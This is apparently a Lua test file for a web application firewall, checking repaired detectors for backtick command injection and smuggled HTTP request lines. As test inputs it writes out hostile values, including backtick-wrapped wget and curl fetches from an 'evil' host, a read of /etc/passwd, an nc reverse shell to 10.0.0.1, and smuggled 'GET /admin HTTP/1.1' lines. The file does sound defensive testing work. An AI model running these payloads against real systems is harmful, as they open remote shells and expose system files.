-- Tests for the two WAF detectors the 2026-07 edge Lua audit found DEAD because
-- Lua patterns have no `(a|b|c)` alternation (the `(wget|curl|...)` / `(get|
-- post|...)` groups were matched as literal strings and never fired):
--
--   * F05 — rule 317 (WAF_CMD_PAYLOAD:PAY_BACKTICK, challenge): a shell command
--     as the first token inside a `backtick` command substitution. The `;`/`|`/
--     `&&`-inside-backticks branch already worked; only the command-word branch
--     was dead. Fixed to a word-set membership test; stays at challenge.
--   * F12 — rule 606 (WAF_HTTP_SMUGGLING, logonly): a "VERB <path> HTTP/n"
--     request line smuggled into a parameter. Was doubly dead — the `|` verb
--     alternation AND a case-sensitive " http/" prefilter that missed the
--     usual uppercase "HTTP/". Fixed both; stays logonly (tested at block here
--     for a crisp hit assertion, per the rule-319 test convention).

_G.ngx = {
  now           = function() return 1000 end,
  decode_base64 = function(_) return nil end,
  log           = function(_, _) end,
  ERR           = 0, WARN = 1, INFO = 2,
}

package.path = "configs/lua/?.lua;" .. package.path
local waf = require("cfm_waf")

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end

-- Disable every rule, then enable the given { name = mode } set.
local function set_only(map)
  local snap = waf.get_config()
  for k, _ in pairs(snap) do
    if k:sub(1, 5) == "rule_" then waf.set_rule(k, "disabled") end
  end
  for k, m in pairs(map) do waf.set_rule(k, m) end
end

local function get(qs)
  return { uri = "/index.php", args = qs, method = "GET", ip = "203.0.113.60", headers = {}, body = "" }
end
local function post(body)
  return {
    uri = "/submit.php", args = "", method = "POST", ip = "203.0.113.61",
    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" }, body = body,
  }
end

local function fires(ctx, label, want_reason)
  local hit, reason = waf.check(ctx)
  check(hit == true, label .. " — hit=true (got " .. tostring(hit) .. ")")
  check(reason == want_reason, label .. " — reason=" .. want_reason .. " (got " .. tostring(reason) .. ")")
end
local function clean(ctx, label)
  local hit = waf.check(ctx)
  check(hit ~= true, label .. " — must NOT fire (got hit=" .. tostring(hit) .. ")")
end

-- ── F05: backtick command substitution (rule 317; pinned to challenge here to
--        exercise the scorer — shipped default is challenge_v2 since 2026-09-23) ─
set_only({ rule_cmd_payload_backtick = "challenge" })

local BT = "WAF_CMD_PAYLOAD:PAY_BACKTICK"
-- Command-word branch (was dead pre-fix): first token is a known command.
-- Non-search param names so the search-field FP carve-out (below) doesn't apply.
fires(get("x=`wget http://evil/x`"),   "backtick wget",   BT)
fires(get("x=`curl http://evil/x`"),   "backtick curl",   BT)
fires(get("x=`id`"),                   "backtick id",     BT)
fires(get("x=`whoami`"),               "backtick whoami", BT)
fires(get("x=`cat /etc/passwd`"),      "backtick cat",    BT)
fires(get("x=`nc -e /bin/sh 10.0.0.1 4444`"), "backtick nc", BT)
fires(get("name=`ping -c1 evil`"),     "backtick ping",   BT)
-- Metachar branch (already worked pre-fix; regression guard).
fires(get("x=`foo;bar`"),              "backtick semi",   BT)
fires(get("x=`foo|bar`"),              "backtick pipe",   BT)
fires(get("x=`foo&&bar`"),             "backtick and",    BT)
-- Cross-param: a benign backtick in a search field must NOT mask a malicious
-- backtick command in another param (the search-field suppression used to be
-- request-global — see the strengthened final check).
fires(get("x=`wget http://evil/x`&q=`hello`"), "cmd in non-search param not masked by benign q=", BT)

-- FP negatives: benign backtick content with neither a command word nor a
-- shell metachar must NOT fire (challenge is user-visible).
clean(get("x=`hello world`"),          "backtick prose")
clean(get("x=`total 5 files`"),        "backtick prose 2")
-- Word-boundary: `%a+` captures the whole first word, so a command PREFIX is
-- not a command — this is what the fix guarantees over a naive substring.
clean(get("x=`category listing`"),     "backtick cat-prefix (category)")
clean(get("x=`idea`"),                 "backtick id-prefix (idea)")
clean(get("x=no backticks here at all"), "no backticks")
-- Intentional FP carve-out: a `backtick` command inside a SEARCH field (q/s/
-- term/search/query) with no hard command-chaining is suppressed, so users
-- searching for shell snippets aren't challenged (ignore_backtick_only path).
clean(get("q=`wget http://evil/x`"),   "backtick wget in search field (suppressed)")

-- ── F12: HTTP request-line smuggling (rule 606; tested at block) ────────────
set_only({ rule_http_smuggling = "block" })

fires(get("next=GET /admin HTTP/1.1"),  "smuggled GET (uppercase, args)",  "WAF_HTTP_SMUGGLING:SMUG_GET")
fires(get("u=post /login http/1.0"),    "smuggled post (lowercase, args)", "WAF_HTTP_SMUGGLING:SMUG_POST")
fires(get("x=PUT /a HTTP/1.1"),         "smuggled PUT (uppercase, args)",  "WAF_HTTP_SMUGGLING:SMUG_PUT")
fires(post("payload=DELETE /x HTTP/2"), "smuggled DELETE (body)",          "WAF_HTTP_SMUGGLING:SMUG_DELETE")

-- FP negatives: "http/" mentions that are not a "VERB /path HTTP/n" request line.
clean(get("q=see the http/2 spec for details"), "prose http/2 mention")
clean(get("url=https://x/http/1/guide"),        "path segment named http")
clean(get("note=get well soon"),                "verb word without request line")
-- Verb-word adjacent to http/N but the target is a word, not a "/path" — must
-- NOT fire (the path anchor rejects English prose about HTTP versions).
clean(post("note=connect to http/2 is supported"), "prose: connect to http/2")
clean(post("body=options for http/2 and copy of http/1.1 spec"), "prose: options/copy + http")

-- Pasted-access-log carve-out [FP 2026-07-21]: combined/common-log lines quote
-- a literal request line ("GET /x HTTP/1.1" 200 26307). A WHMCS ticket reply
-- carrying such lines got challenged (and the 1MB multipart POST could not be
-- replayed, losing the reply). The quoted-line + 3-digit-status fingerprint is
-- exempted; a bare smuggled line still fires.
local LOG_LINES = table.concat({
  'message=Ο crawler περνάει κανονικά, δείτε τα logs:\r\n',
  '173.252.82.52 - - [21/Jul/2026:11:36:13 +0300] "GET /2026/07/20/charopo-xerizothike-dentro-toys-anemoys-ki-epese-se-aytokinito/ HTTP/1.1" 200 26307 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"\r\n',
  '69.63.184.27 - - [21/Jul/2026:11:36:15 +0300] "GET /2026/07/20/charopo-xerizothike-dentro-toys-anemoys-ki-epese-se-aytokinito/ HTTP/1.1" 200 26307 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"\r\n',
})
clean(post(LOG_LINES), "pasted access-log lines in ticket body (quoted + status)")
clean(post('log=1.2.3.4 - - [21/Jul/2026] "POST /wp-login.php HTTP/1.1" 403 199 "-" "curl/8.0"'),
  "single pasted log line, POST + 403")
clean(post('log="HEAD /健康 HTTP/2" 204 -'), "pasted log line, HTTP/2 + 204")
-- The exemption must NOT weaken the attack shape:
fires(post("payload=GET /admin HTTP/1.1"), "bare smuggled line still fires", "WAF_HTTP_SMUGGLING:SMUG_GET")
fires(post('x="GET /admin HTTP/1.1" and more'), "quoted line WITHOUT status still fires", "WAF_HTTP_SMUGGLING:SMUG_GET")
fires(post('x=GET /admin HTTP/1.1" 200'), "status without leading quote still fires", "WAF_HTTP_SMUGGLING:SMUG_GET")
fires(post('x="GET /admin HTTP/1.1" 20000 body'), "5-digit trailer is not a status — still fires", "WAF_HTTP_SMUGGLING:SMUG_GET")
-- Mixed: one exempt log line PLUS one bare smuggled line — the bare one wins.
fires(post(LOG_LINES .. "&inject=DELETE /etc HTTP/1.1"),
  "log paste must not mask a bare smuggled line elsewhere", "WAF_HTTP_SMUGGLING:SMUG_DELETE")

if fails > 0 then
  io.stderr:write(("cfm_waf backtick/smuggling tests: %d FAILED\n"):format(fails))
  os.exit(1)
end
print("ok: cfm_waf backtick (rule 317) + http-smuggling (rule 606) dead-detector fixes")
